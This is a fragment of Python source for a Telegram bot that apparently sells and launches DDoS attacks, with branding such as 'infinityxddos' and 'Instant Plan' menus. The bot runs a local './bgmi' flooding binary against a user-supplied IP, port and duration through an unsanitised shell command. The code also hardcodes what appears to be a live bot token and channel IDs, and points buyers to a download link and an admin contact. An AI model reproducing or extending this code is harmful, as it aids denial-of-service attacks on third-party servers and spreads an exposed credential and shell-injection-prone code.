...
TOKEN = '7377981339:AAHRwinvveubBY8_S413REQeL5-Ldkuswbs'
...
FORWARD_CHANNEL_ID = -1002185826885
CHANNEL_ID = -1002185826885
error_channel_id = -1002185826885
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 360")
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/infinityxddos/5834*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "*Contact admin @GOKU_OWNER*", parse_mode='Markdown')
    else:
